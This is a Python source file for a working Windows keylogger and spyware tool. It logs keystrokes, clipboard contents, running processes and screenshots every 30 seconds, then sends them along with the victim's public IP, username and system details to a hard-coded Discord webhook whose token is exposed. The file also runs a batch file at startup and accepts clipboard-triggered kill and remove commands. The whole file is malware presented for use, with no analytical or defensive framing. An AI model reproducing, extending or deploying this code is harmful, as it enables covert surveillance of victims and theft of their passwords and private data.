import os
import requests
import threading
import subprocess
import time
from pynput import keyboard
import psutil
import pyperclip
import pyautogui
import io
from datetime import datetime

# Discord webhook URL (replace with your own webhook URL)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'

# Store the keystrokes
keystrokes = ""
lock = threading.Lock()
last_keypress_time = time.time()
last_clipboard = ""
pyperclip.copy("")

# Dictionary for special keys
special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: " [ENTER] ",
    keyboard.Key.backspace: " <- ",
    keyboard.Key.tab: " [TAB] ",
    keyboard.Key.shift: " [SHIFT] ",
    keyboard.Key.ctrl_l: " [CTRL] ",
    keyboard.Key.alt_l: " [ALT] ",
    keyboard.Key.cmd: " [CMD] ",
    keyboard.Key.esc: " [ESC] ",
}

username = os.getlogin()


def run_bat_file():
    """Run the kill.bat file when the script starts."""
    bat_file_path = rf"C:\users\{username}\kl2.1\kill.bat"  # Update the path to your kill.bat file
    try:
        subprocess.run([bat_file_path], check=True)
        print(f"Successfully ran {bat_file_path}")
    except subprocess.CalledProcessError as e:
        print(f"Error running {bat_file_path}: {e}")


def get_public_ip():
    """Fetch the public IP address using an external API."""
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json().get("ip")
        else:
            return "Unknown"
    except Exception as e:
        print(f"Error getting public IP address: {e}")
        return "Unknown"


def send_to_webhook(message):
    """Send the message to the Discord webhook."""
    payload = {"content": message}
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            print("Webhook message sent successfully.")
        else:
            print(f"Failed to send webhook message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message to webhook: {e}")


def keystroke_monitor():
    """Monitor keystrokes and send them after 3 seconds of inactivity."""
    global keystrokes, last_keypress_time
    while True:
        time.sleep(1)
        with lock:
            if keystrokes and time.time() - last_keypress_time > 3:
                send_to_webhook(keystrokes)
                keystrokes = ""


def on_press(key):
    global keystrokes, last_keypress_time
    try:
        key_str = key.char
    except AttributeError:
        key_str = special_keys.get(key, f"[{key}]")

    with lock:
        keystrokes += key_str
        last_keypress_time = time.time()


def on_release(key):
    global last_clipboard
    try:
        # Check if clipboard has changed
        current_clipboard = pyperclip.paste()

        # If clipboard content has changed, send it to the webhook
        if current_clipboard != last_clipboard:
            last_clipboard = current_clipboard
            send_to_webhook(f"{username} just copied something to clipboard!")
            send_to_webhook(f"Clipboard content: {current_clipboard}")

        # Handle the /kill or /remove clipboard commands
        if "/kill" in current_clipboard:
            send_to_webhook(f"Kill command executed by: {username}")
            send_to_webhook("Launching again on restart.")
            return False

        elif "/remove" in current_clipboard:
            send_to_webhook(f"Removed by: {username}")
            file_path = rf"C:\users\{username}\kl2.1"
            try:
                os.rmdir(file_path)
                send_to_webhook(f"Directory removed: {file_path}")
            except OSError as e:
                send_to_webhook(f"Error removing directory: {e}")
            return False

    except Exception as e:
        print(f"Error accessing clipboard: {e}")

    return True


def monitor_clipboard():
    """Monitor the clipboard for changes and send the content to the webhook."""
    global last_clipboard
    while True:
        time.sleep(1)
        try:
            current_clipboard = pyperclip.paste()

            # If clipboard content has changed, send it to the webhook
            if current_clipboard != last_clipboard:
                last_clipboard = current_clipboard
                send_to_webhook(f"{username} just copied something to clipboard!")
                send_to_webhook(f"Clipboard content: {current_clipboard}")

        except Exception as e:
            print(f"Error accessing clipboard: {e}")


def monitor_processes():
    running_processes = set()
    first_check = True  # Flag to handle the first delay

    while True:
        current_processes = set(p.name() for p in psutil.process_iter())
        new_processes = current_processes - running_processes
        closed_processes = running_processes - current_processes

        # If it's the first check, wait for 15 seconds
        if first_check:
            time.sleep(10)  # Initial delay of 15 seconds
            first_check = False  # Disable the first check flag

        for proc in new_processes:
            message = f"Started: {proc}"
            send_to_webhook(message)

        for proc in closed_processes:
            message = f"Closed: {proc}"
            send_to_webhook(message)

        running_processes = current_processes
        time.sleep(1)  # Check every 2 seconds after the first check


def send_to_webhook_pic(filename):
    """Send the screenshot to the Discord webhook."""
    with open(filename, "rb") as file:
        payload = {"content": "New Screenshot!"}
        files = {"file": file}

        try:
            response = requests.post(WEBHOOK_URL, data=payload, files=files)
            if response.status_code == 200 or response.status_code == 204:
                print("Webhook message sent successfully.")
            else:
                print(f"Failed to send webhook message. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending message to webhook: {e}")


def screenshot():
    while True:
        print("Taking screenshot...")  # Debug print
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"screen_{now}.png"

        screenshotpng = pyautogui.screenshot()
        screenshotpng.save(filename)

        print(f"Screenshot saved as {filename}")  # Debug print

        send_to_webhook_pic(filename)

        time.sleep(30)  # Reduced for testing


threading.Thread(target=screenshot, daemon=True).start()


# Start process monitoring in a separate thread
process_thread = threading.Thread(target=monitor_processes, daemon=True)
process_thread.start()

# Run kill.bat file at the start
run_bat_file()

# Get and send public IP and username
username = os.getlogin()
public_ip = get_public_ip()
send_to_webhook(f"Connection established. Public IP address: {public_ip}")
send_to_webhook(f"Current user: {username}")

# Gather system information
cpu_count = psutil.cpu_count(logical=True)
cpu_percent = psutil.cpu_percent(interval=1)
memory_info = psutil.virtual_memory()
disk_info = psutil.disk_usage('/')

send_to_webhook(f"CPU cores: {cpu_count}")
send_to_webhook(f"CPU percent: {cpu_percent}%")
send_to_webhook(
    f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
send_to_webhook(
    f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")

# Start the keystroke monitor and clipboard monitor threads
threading.Thread(target=keystroke_monitor, daemon=True).start()
threading.Thread(target=monitor_clipboard, daemon=True).start()

# Set up the keyboard listener
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Listener stopped.")
